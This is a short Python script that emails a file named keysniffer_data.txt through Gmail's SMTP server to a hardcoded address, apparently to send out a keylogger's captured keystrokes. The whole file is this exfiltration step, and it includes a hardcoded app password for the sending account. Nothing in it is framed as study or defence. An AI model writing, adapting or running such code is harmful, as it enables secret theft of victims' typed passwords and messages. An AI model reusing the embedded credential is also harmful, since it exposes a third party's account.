import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Email sender and receiver details
password = "ixtzymqtphizlcet"
sender_email = "7unkym0nk3y@gmail.com"  # email from the account
receiver_email = "7unkym0nk3y@gmail.com"  # email from the sender

# Create the email object
message = MIMEMultipart()
message["From"] = sender_email
message["To"] = receiver_email
message["Subject"] = "File Attachment: keysniffer_data.txt"

# Email body
email_body = """<html><body><p>Please find the attached file keysniffer_data.txt.</p></body></html>"""
message.attach(MIMEText(email_body, "html"))

# File to attach
file_path = "keysniffer_data.txt"

# Attach the file
with open(file_path, "rb") as file:
    part = MIMEBase("application", "octet-stream")
    part.set_payload(file.read())
    encoders.encode_base64(part)
    part.add_header(
        "Content-Disposition",
        f"attachment; filename={file_path}",
    )
    message.attach(part)

# Send the email
try:
    with smtplib.SMTP(
        "smtp.gmail.com:587"
    ) as server:  # Replace with your SMTP server and port
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message.as_string())
        print("Email sent successfully.")
except Exception as e:
    print(f"An error occurred: {e}")
